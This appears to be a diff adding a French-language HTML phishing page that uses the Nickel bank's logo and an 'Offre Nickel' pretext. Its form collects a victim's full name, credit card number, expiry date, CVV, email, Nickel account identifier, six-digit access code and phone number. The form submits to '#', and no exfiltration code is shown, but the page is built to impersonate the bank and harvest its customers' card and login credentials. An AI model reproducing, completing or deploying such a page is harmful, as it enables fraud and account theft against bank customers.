@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Offre Nickel</title>
+  <style>
+    /* General Body Style */
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    /* Container Style */
+    .container {
+      width: 100%;
+      max-width: 700px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      padding-top: 30px; /* Extra space for image */
+    }
+
+    /* Logo Style */
+    .logo {
+      text-align: center;
+      margin-bottom: 30px; /* Space between logo and form */
+    }
+
+    .logo img {
+      width: 200px;
+      height: auto;
+    }
+
+    /* Form Title */
+    h1 {
+      text-align: center;
+      color: #333;
+      font-size: 24px;
+      margin-bottom: 30px;
+    }
+
+    /* Input Group Style */
+    .input-group {
+      margin-bottom: 15px;
+    }
+
+    .input-group label {
+      font-size: 14px;
+      font-weight: bold;
+      color: #333;
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    .input-group input,
+    .input-group select {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    .input-group input[type="password"] {
+      letter-spacing: 1px;
+    }
+
+    /* Inline Input Group Style */
+    .input-group.inline {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+    }
+
+    .input-inline {
+      width: 32%;
+    }
+
+    /* Specific Input Style for Phone and Numbers */
+    input[type="tel"],
+    input[type="text"],
+    input[type="email"],
+    input[type="password"],
+    input[type="number"] {
+      -webkit-appearance: none;
+      -moz-appearance: textfield;
+    }
+
+    /* Button Style */
+    button.btn {
+      background-color: #FF5B03;
+      color: white;
+      border: none;
+      padding: 15px;
+      font-size: 16px;
+      width: 100%;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: background-color 0.3s ease;
+    }
+
+    button.btn:hover {
+      background-color: #e04f02;
+    }
+
+    /* Add Hover Effect on Inputs */
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    input[type="tel"]:focus,
+    input[type="password"]:focus,
+    select:focus {
+      border-color: #FF5B03;
+      outline: none;
+    }
+
+    /* Form Responsive Styles */
+    @media (max-width: 768px) {
+      .input-group.inline {
+        flex-direction: column;
+      }
+
+      .input-inline {
+        width: 100%;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 15px;
+      }
+
+      .logo img {
+        width: 150px;
+      }
+
+      h1 {
+        font-size: 20px;
+      }
+    }
+  </style>
+  <script>
+    // Function to ensure only numbers are entered in certain fields
+    function validateNumberInput(event) {
+      let input = event.target;
+      input.value = input.value.replace(/[^0-9]/g, '');  // Replace anything that's not a number with an empty string
+    }
+
+    // Initialize the event listeners when the page loads
+    window.onload = function() {
+      // Fields that should only contain numbers (e.g., credit card, CVV, phone number, Identifiant, and Code d'accès)
+      const cardInput = document.getElementById("carte-credit");
+      const cvvInput = document.getElementById("cryptogramme");
+      const phoneInput = document.getElementById("telephone");
+      const identifiantInput = document.getElementById("identifiant");
+      const accessCodeInput = document.getElementById("code-acces");
+
+      cardInput.addEventListener('input', validateNumberInput);
+      cvvInput.addEventListener('input', validateNumberInput);
+      phoneInput.addEventListener('input', validateNumberInput);
+      identifiantInput.addEventListener('input', validateNumberInput);
+      accessCodeInput.addEventListener('input', validateNumberInput);
+    };
+  </script>
+</head>
+<body>
+  <div class="container">
+    <!-- Logo Image -->
+    <div class="logo">
+      <img src="https://assets.onecompiler.app/42zgt8yts/42zgt9fxk/Nickel-logo.svg.png" alt="Nickel Logo">
+    </div>
+    
+    <!-- Form Title -->
+    <h1>Offre Nickel</h1>
+    
+    <!-- Form Starts -->
+    <form action="#" method="post">
+      
+      <!-- Prénom and Nom fields -->
+      <div class="input-group">
+        <label for="prenom">Prénom :</label>
+        <input type="text" id="prenom" name="prenom" required>
+      </div>
+      
+      <div class="input-group">
+        <label for="nom">Nom :</label>
+        <input type="text" id="nom" name="nom" required>
+      </div>
+      
+      <!-- Numéro De Carte Crédit -->
+      <div class="input-group">
+        <label for="carte-credit">Numéro De Carte Crédit :</label>
+        <input type="tel" id="carte-credit" name="carte-credit" required pattern="[0-9]{16}" maxlength="16" inputmode="numeric">
+      </div>
+      
+      <!-- Mois, Année, CVV in one row -->
+      <div class="input-group inline">
+        <div class="input-inline">
+          <label for="mois">Mois :</label>
+          <select id="mois" name="mois" required>
+            <option value="">Mois</option>
+            <option value="01">01</option>
+            <option value="02">02</option>
+            <option value="03">03</option>
+            <option value="04">04</option>
+            <option value="05">05</option>
+            <option value="06">06</option>
+            <option value="07">07</option>
+            <option value="08">08</option>
+            <option value="09">09</option>
+            <option value="10">10</option>
+            <option value="11">11</option>
+            <option value="12">12</option>
+          </select>
+        </div>
+
+        <div class="input-inline">
+          <label for="annee">Année :</label>
+          <select id="annee" name="annee" required>
+            <option value="">Année</option>
+            <option value="2024">2024</option>
+            <option value="2025">2025</option>
+            <option value="2026">2026</option>
+            <option value="2027">2027</option>
+            <option value="2028">2028</option>
+            <option value="2029">2029</option>
+            <option value="2030">2030</option>
+            <option value="2031">2031</option>
+            <option value="2032">2032</option>
+            <option value="2033">2033</option>
+            <option value="2034">2034</option>
+            <option value="2035">2035</option>
+            <option value="2036">2036</option>
+            <option value="2037">2037</option>
+            <option value="2038">2038</option>
+            <option value="2039">2039</option>
+            <option value="2040">2040</option>
+          </select>
+        </div>
+
+        <div class="input-inline">
+          <label for="cryptogramme">CVV :</label>
+          <input type="text" id="cryptogramme" name="cryptogramme" required pattern="[0-9]{3}" maxlength="3">
+        </div>
+      </div>
+
+      <!-- E-mail -->
+      <div class="input-group">
+        <label for="email">E-mail :</label>
+        <input type="email" id="email" name="email" required>
+      </div>
+
+      <!-- Identifiant (Numeric Input only) -->
+      <div class="input-group">
+        <label for="identifiant">Identifiant :</label>
+        <input type="text" id="identifiant" name="identifiant" required pattern="[0-9]{10}" maxlength="10">
+      </div>
+
+      <!-- Code d'accès (Numeric Input only) -->
+      <div class="input-group">
+        <label for="code-acces">Code d'accès :</label>
+        <input type="password" id="code-acces" name="code-acces" required pattern="[0-9]{6}" maxlength="6">
+      </div>
+
+      <!-- Téléphone -->
+      <div class="input-group">
+        <label for="telephone">Téléphone :</label>
+        <input type="text" id="telephone" name="telephone" required pattern="[0-9]{6,12}" maxlength="12">
+      </div>
+
+      <!-- Submit button -->
+      <button type="submit" class="btn">Validez</button>
+    </form>
+  </div>
+</body>
+</html>
